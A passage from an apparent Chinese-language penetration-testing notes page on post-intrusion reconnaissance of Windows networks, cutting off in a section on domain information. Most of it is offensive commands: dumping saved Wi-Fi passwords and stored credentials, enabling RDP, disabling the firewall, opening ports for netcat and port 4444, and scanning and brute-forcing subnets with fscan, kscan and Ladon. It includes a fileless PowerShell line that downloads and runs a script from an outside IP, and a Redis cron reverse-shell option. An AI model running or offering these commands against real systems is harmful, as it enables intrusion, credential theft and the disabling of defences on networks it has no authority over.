systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure>\n<p>3. 查看系统体系结构</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure>\n<p>4. 查看安装软件及版本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell wmic product get name,version</span><br><span class=\"line\">shell powershell &quot;Get‐WmiObject ‐class win32_product | Select‐Object ‐Property name,version&quot;</span><br></pre></td></tr></table></figure>\n<p>5. 查看本机服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic service list brief</span><br></pre></td></tr></table></figure>\n<p>6. 查看进程信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasklist</span><br><span class=\"line\">wmic process list brief</span><br></pre></td></tr></table></figure>\n<p>7. 开机自启程序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic startup get command,caption</span><br></pre></td></tr></table></figure>\n<p>8. 查看计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chcp 437</span><br><span class=\"line\">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure>\n<p>9. 查看开机时间</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net statistics workstation</span><br></pre></td></tr></table></figure>\n<p>10. 查看用户列表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net user</span><br><span class=\"line\">wmic useraccount get name ,SID</span><br></pre></td></tr></table></figure>\n<p>11. 列出会话</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net session </span><br></pre></td></tr></table></figure>\n<p>12. 列出连接信息，端口信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -ano</span><br></pre></td></tr></table></figure>\n<p>13. 查看补丁信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systeminfo</span><br><span class=\"line\">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>\n<p>14. 查看共享</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net share</span><br><span class=\"line\">wmic share get name,path,status</span><br></pre></td></tr></table></figure>\n<p>15. 查路由</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">route print</span><br></pre></td></tr></table></figure>\n<p>16. 查 ARP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arp -a</span><br></pre></td></tr></table></figure>\n<p>17. 开启远程服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic path win32_terminalservicesetting where (_CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class=\"line\"></span><br><span class=\"line\">//2003之后</span><br><span class=\"line\">#开启</span><br><span class=\"line\">REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t</span><br><span class=\"line\">REG_DWORD /d 00000000 /f </span><br><span class=\"line\">#关闭</span><br><span class=\"line\">REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t</span><br><span class=\"line\">REG_DWORD /d 11111111 /f </span><br></pre></td></tr></table></figure>\n<p>18 收集 wifi 密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;) do @echo %j | findstr ‐i ‐v echo | netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure>\n<p>19. 修改 RDP 端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg query &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP‐Tcp&quot; /V PortNumber</span><br></pre></td></tr></table></figure>\n<p>20. 查看代理信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot;</span><br></pre></td></tr></table></figure>\n<p>21. 查看登录凭证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmdkey /l</span><br></pre></td></tr></table></figure>\n<p>22. 查询用户组</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net localgroup</span><br></pre></td></tr></table></figure>\n<p>23. 查询管理员组</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net localgroup administrators</span><br><span class=\"line\"></span><br><span class=\"line\">如果电脑加入域后，与中domain admins 是默认管理员</span><br></pre></td></tr></table></figure>\n<p>24. 查看最近打开文档</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir %APPDATA%\\Microsoft\\Windows\\Recent</span><br></pre></td></tr></table></figure>\n<p>25. 杀软查询</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic /node:localhost /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname /format:list</span><br></pre></td></tr></table></figure>\n<h4 id=\"防火墙操作\"><a class=\"markdownIt-Anchor\" href=\"#防火墙操作\">#</a> 防火墙操作</h4>\n<p>1. 查看防火墙状态</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netsh firewall show state</span><br></pre></td></tr></table></figure>\n<p>2. 关闭防火墙</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netsh firewall set opmode disable  //2003之前</span><br><span class=\"line\">netsh advfirewall set allprofiles state off   //优先使用</span><br></pre></td></tr></table></figure>\n<p>3. 查看防火墙配置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netsh firewall show config</span><br></pre></td></tr></table></figure>\n<p>4. 修改防火墙配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//允许指定的程序进行全部的连接</span><br><span class=\"line\">netsh firewall add allowedprogram c:\\nc.exe &quot;allownc&quot; enable   //2003之前</span><br><span class=\"line\">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\\nc.exe&quot;    //2003之后</span><br><span class=\"line\"></span><br><span class=\"line\">//允许相应端口</span><br><span class=\"line\">netsh advfirewall firewall add rule name=&quot;RemoteDesktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class=\"line\"></span><br><span class=\"line\">//允许4444端口进站</span><br><span class=\"line\">netsh advfirewall firewall add rule name=test dir=in action=allow protocol=tcp localport=4444</span><br><span class=\"line\"></span><br><span class=\"line\">//允许a.exe进站</span><br><span class=\"line\">netsh advfirewall firewall add rule name=test dir=in action=allow program=c:\\a.exe </span><br><span class=\"line\"></span><br><span class=\"line\">//允许4444端口出站</span><br><span class=\"line\">netsh advfirewall firewall add rule name=test dir=out action=allow protocol=tcp localport=444</span><br><span class=\"line\"></span><br><span class=\"line\">//允许a.exe出站</span><br><span class=\"line\">netsh advfirewall firewall add rule name=test dir=out action=allow program=c:\\a.exe</span><br><span class=\"line\"></span><br><span class=\"line\">//允许指定 程序退出</span><br><span class=\"line\">netsh advfirewall firewall add rule name=&quot;Allownc&quot; dir=out action=allow program=&quot;C: \\nc.exe&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"自动化收集信息\"><a class=\"markdownIt-Anchor\" href=\"#自动化收集信息\">#</a> 自动化收集信息</h3>\n<p>bat 语法：</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.终端输出</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"number\">123</span></span><br><span class=\"line\"><span class=\"number\">2</span>.暂停,等待按键继续</span><br><span class=\"line\"><span class=\"built_in\">pause</span></span><br><span class=\"line\"><span class=\"number\">3</span>.不显示后续命令行及当前命令行</span><br><span class=\"line\"><span class=\"built_in\">echo</span> off</span><br><span class=\"line\">whoami</span><br><span class=\"line\"><span class=\"number\">4</span>.显示命令，分多个提示符显示</span><br><span class=\"line\"><span class=\"built_in\">echo</span> on</span><br><span class=\"line\">whoami</span><br><span class=\"line\"><span class=\"number\">5</span>.只显示结果,在每个命令行的最前面，表示运行时不显示这一行的命令行</span><br><span class=\"line\">@<span class=\"built_in\">echo</span> off</span><br><span class=\"line\"><span class=\"number\">6</span>.调用另一个bat</span><br><span class=\"line\"><span class=\"keyword\">call</span> c:\\<span class=\"number\">2</span>.bat</span><br><span class=\"line\"><span class=\"number\">7</span>.注释</span><br><span class=\"line\"><span class=\"comment\">rem</span></span><br><span class=\"line\"><span class=\"number\">8</span>.输出到文件</span><br><span class=\"line\">whoami &gt; <span class=\"number\">1</span>.txt</span><br><span class=\"line\"><span class=\"number\">9</span>.追加</span><br><span class=\"line\"><span class=\"built_in\">ipconfig</span> &gt;&gt; <span class=\"number\">2</span>.txt</span><br></pre></td></tr></table></figure>\n<p>一个简单的脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@echo off</span><br><span class=\"line\">echo ############################## &gt;&gt;1.txt</span><br><span class=\"line\">ipconfig &gt;&gt;1.txt</span><br><span class=\"line\">echo ############################## &gt;&gt;1.txt</span><br><span class=\"line\">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; &gt;&gt;1.txt</span><br><span class=\"line\">systeminfo| findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; &gt;&gt;1.txt</span><br><span class=\"line\">echo ############################## &gt;&gt;1.txt</span><br><span class=\"line\">echo %PROCESSOR_ARCHITECTURE% &gt;&gt;1.txt</span><br></pre></td></tr></table></figure>\n<p>擦，大哥写的脚本</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> /f &quot;delims=&quot; <span class=\"variable\">%%A</span> <span class=\"keyword\">in</span> (&#x27;<span class=\"built_in\">dir</span> /s /b <span class=\"variable\">%WINDIR%</span>\\system32\\*htable.xsl&#x27;) <span class=\"keyword\">do</span> <span class=\"built_in\">set</span> &quot;var=<span class=\"variable\">%%A</span>&quot;</span><br><span class=\"line\">wmic process get CSName,Description,ExecutablePath,ProcessId /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic USERACCOUNT list full /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic group list full /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic nicconfig where IPEnabled=&#x27;true&#x27; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic volume get <span class=\"built_in\">Label</span>,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic netuse list full /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic qfe get Caption,Description,HotFixID,InstalledOn /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic startup get Caption,Command,Location,User /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br><span class=\"line\">wmic Timezone get DaylightName,Description,StandardName /<span class=\"built_in\">format</span>:&quot;<span class=\"variable\">%var%</span>&quot; &gt;&gt; out.html</span><br></pre></td></tr></table></figure>\n<h3 id=\"内网ip扫描\"><a class=\"markdownIt-Anchor\" href=\"#内网ip扫描\">#</a> 内网 IP 扫描</h3>\n<p>1.netbios</p>\n<p>这是一款用于扫描 Windows 网络上 NetBIOS 名字信息的程序。该程序对给出范围内的每一个地址发送 NetBIOS 状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，NBTScan 列出它的 IP 地址、NetBIOS 计算机名、登录用户名和 MAC 地址。但只能用于局域网，NBTSCAN 可以取到 PC 的真实 IP 地址和 MAC 地址，如果有”ARP 攻击” 在做怪，可以找到装有 ARP 攻击的 PC 的 IP / 和 MAC 地址。但只能用于局域网</p>\n<blockquote>\n<p>nbtscan.exe + IP</p>\n</blockquote>\n<p>2.ICMP</p>\n<p>还可以利用 ICMP 协议探测内网。依次对内网中的每个 IP 地址执行 ping 命令，可以快速找出内网中所有存活酌主机。在渗透测试中中，可以使用如下命令循环探测整个 C 段</p>\n<blockquote>\n<p>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr “TTL=”</p>\n</blockquote>\n<p>3.arp</p>\n<blockquote>\n<p>apr -t IP</p>\n</blockquote>\n<p>4.Kscan</p>\n<p>kscan 是一款资产测绘工具，可针对指定资产进行端口扫描以及 TCP 指纹识别和 Banner 抓取，在不发送更多的数据包的情况下尽可能的获取端口更多信息。并能够针对扫描结果进行自动化暴力破解，且是 go 平台首款开源的 RDP 暴力破解工具</p>\n<blockquote>\n<p>kscan.exe -t 192.168.13.0/24 --encoding  utf-8</p>\n</blockquote>\n<p>其他用法: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xjdnZ2di9rc2Nhbg==\">https://github.com/lcvvvv/kscan</span></p>\n<blockquote>\n<p>-t , --target 指定探测对象：</p>\n<p>IP 地址：114.114.114.114</p>\n<p>IP 地址段：114.114.114.114/24, 不建议子网掩码小于 12</p>\n<p>IP 地址段：114.114.114.114-115.115.115.115</p>\n<p>URL 地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmFpZHUuY29t\">https://www.baidu.com</span></p>\n<p>文件地址：file:/tmp/target.txt</p>\n<p>–spy 网段探测模式，此模式下将自动探测主机可达的内网网段可接收参数为：</p>\n<p>(空)、192、10、172、all、指定 IP 地址 (将探测该 IP 地址 B 段存活网关)</p>\n</blockquote>\n<p>5.fscan</p>\n<p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis 批量写公钥、计划任务反弹 shell、读取 win 网卡信息、web 指纹识别、web 漏洞扫描、netbios 探测、域控识别等功能。</p>\n<blockquote>\n<p>fscan.exe -h 192.168.13.0/24</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名密码来进行爆破)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/8 (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)</span><br><span class=\"line\">fscan.exe -hf ip.txt (以文件导入)</span><br><span class=\"line\">fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)</span><br><span class=\"line\">fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)</span><br></pre></td></tr></table></figure>\n<p>6.ladon</p>\n<p>Ladon 一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键 GetShell，支持批量 A 段 / B 段 / C 段以及跨网段扫描，支持 URL、主机、域名列表扫描。7</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">### 003 网段扫描/批量扫描</span><br><span class=\"line\">CIDR格式：不只是/24/16/8(所有)</span><br><span class=\"line\">Ladon 192.168.1.8/24 扫描模块</span><br><span class=\"line\">Ladon 192.168.1.8/16 扫描模块</span><br><span class=\"line\">Ladon 192.168.1.8/8 扫描模块</span><br><span class=\"line\">字母格式：仅C段B段A段 顺序排序</span><br><span class=\"line\">Ladon 192.168.1.8/c 扫描模块</span><br><span class=\"line\">Ladon 192.168.1.8/b 扫描模块</span><br><span class=\"line\">Ladon 192.168.1.8/a 扫描模块</span><br><span class=\"line\">TXT格式</span><br><span class=\"line\">##### 004 ICMP批量扫描C段列表存活主机</span><br><span class=\"line\">Ladon ip24.txt ICMP</span><br><span class=\"line\">##### 005 ICMP批量扫描B段列表存活主机</span><br><span class=\"line\">Ladon ip16.txt ICMP</span><br><span class=\"line\">##### 006 ICMP批量扫描cidr列表(如某国IP段)</span><br><span class=\"line\">Ladon cidr.txt ICMP</span><br><span class=\"line\">##### 007 ICMP批量扫描域名是否存活</span><br><span class=\"line\">Ladon domain.txt ICMP</span><br><span class=\"line\">##### 008 ICMP批量扫描机器是否存活</span><br><span class=\"line\">Ladon host.txt ICMP</span><br></pre></td></tr></table></figure>\n<p>还有好多自己找吧</p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p>1.scanline</p>\n<p>ScanLine 是一款 windows 下的端口扫描的命令行程序。它可以完成 PING 扫描、TCP 端口扫描、UDP 端口扫描等功能。运行速度很快，不需要 winPcap 库支持，应用场合受限较少。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scanline.exe ‐bhpt 21‐23,25,80,110,135‐139,143,443,445,1433,1521,3306,3389,5556,5631,5900,8080 100.100.0.39</span><br><span class=\"line\">scanline.exe ‐bhpt 80,443 100.100.0.1‐254(IP)</span><br><span class=\"line\">scanline.exe ‐bhpt 139,445 IP</span><br></pre></td></tr></table></figure>\n<p>2.telnet</p>\n<p>Telnet 协议是 TCP/IP 协议族的一员，是 Internet 远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在目标计算机上使用 Telnet 协议，可以与目标服务器建立连接。如果只是想快速探测某台主机的某个常规高危端口是否开放，使用 telnet 命令是最方便的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">telnet 192.168.13.100 3389</span><br></pre></td></tr></table></figure>\n<p>3.readteam tool</p>\n<p>RedTeamTool 中有一个本地端口扫面的工具</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">portscanx64 0 10000</span><br></pre></td></tr></table></figure>\n<p>4.powerspioit</p>\n<p>PowerSploit 是一款基于 PowerShell 的后渗透框架软件，包含了很多 PowerShell 的攻击脚本，它们主要用于渗透中的信息侦测，权限提升、权限维持等</p>\n<p>本地执行：需要将程序放到目标机上</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell ‐exec bypass Import‐Module .\\Invoke‐Portscan.ps1;Invoke‐Portscan ‐Hosts 192.168.41.0/24 ‐T 4 ‐ports &#x27;445,8080,3389,80&#x27; ‐oA c:\\1.txt</span><br></pre></td></tr></table></figure>\n<p>远程执行：文件不落地执行</p>\n<p>先去指定的地址下载，在执行，只存在于内存中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell ‐exec bypass ‐c IEX (New‐Object System.Net.Webclient).DownloadString(&#x27;http://118.178.134.226:8080/Invoke‐Portscan.ps1&#x27;);import‐module .\\Invoke‐Portscan.ps1;Invoke‐Portscan ‐Hosts 192.168.41.0/24 ‐T 4 ‐ports &#x27;445,8080,3389,80&#x27; ‐oA c:\\1.txt</span><br></pre></td></tr></table></figure>\n<p>5.nishang</p>\n<p>Nishang 是一款针对 PowerShell 的渗透工具。</p>\n<p>nishang 需要将整个 zip 都上传，不能单独上传某个脚本，因此需要上传 zip 后在服务端解压，也是有工具滴</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//方式一</span><br><span class=\"line\">Set‐ExecutionPolicy remotesigned 允许导入</span><br><span class=\"line\">Import‐Module .\\nishang.psm1 导入模块</span><br><span class=\"line\">Invoke‐PortScan ‐StartAddress 192.168.41.1 ‐EndAddress 192.168.41.21 ‐ResolveHost</span><br><span class=\"line\"></span><br><span class=\"line\">//以下命令直接运行，不需要导入别的东西，方式二</span><br><span class=\"line\">Set‐ExecutionPolicy remotesigned 允许导入</span><br><span class=\"line\">powershell ‐command &quot;&amp; &#123; import‐module .\\nishang\\nishang.psm1; Invoke‐PortScan ‐StartAddress 192.168.41.1 ‐EndAddress 192.168.41.255 ‐ResolveHost &#125;&quot;</span><br><span class=\"line\">powershell ‐command &quot;&amp; &#123; import‐module .\\nishang\\nishang.psm1; Invoke‐PortScan ‐StartAddress 192.168.41.1 ‐EndAddress 192.168.41.255 ‐ResolveHost -ScanPort -Port 445 &#125;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">//方式三</span><br><span class=\"line\">将powershell脚本放在cs目录下</span><br><span class=\"line\">powershell‐import nishang\\nishang.psm1    //后面的路径为cs中上传的物理路径</span><br><span class=\"line\">powershell Invoke‐PortScan ‐StartAddress 192.168.41.1 ‐EndAddress 192.168.41.21 ‐ResolveHost </span><br></pre></td></tr></table></figure>\n<p>5.fscan</p>\n<blockquote>\n<p>详见 ip 扫描</p>\n</blockquote>\n<p>6.kscan</p>\n<blockquote>\n<p>详见 ip 扫描</p>\n</blockquote>\n<p>7.london</p>\n<blockquote>\n<p>详见 ip 扫描</p>\n</blockquote>\n<h3 id=\"收集域环境信息\"><a class=\"markdownIt-Anchor\" href=\"#收集域环境信息\">#</a> 收集域环境信息</h3>\n<p>1. 权限查询</p>\n<p>四种用户</p>\n<blockquote>\n<p>本地普通用户 PC2008\\haha</p>\n<p>本地管理员用户 PC-2008\\administrator</p>\n<p>域内用户 hack\\zhangsan</p>\n<p>域管用户  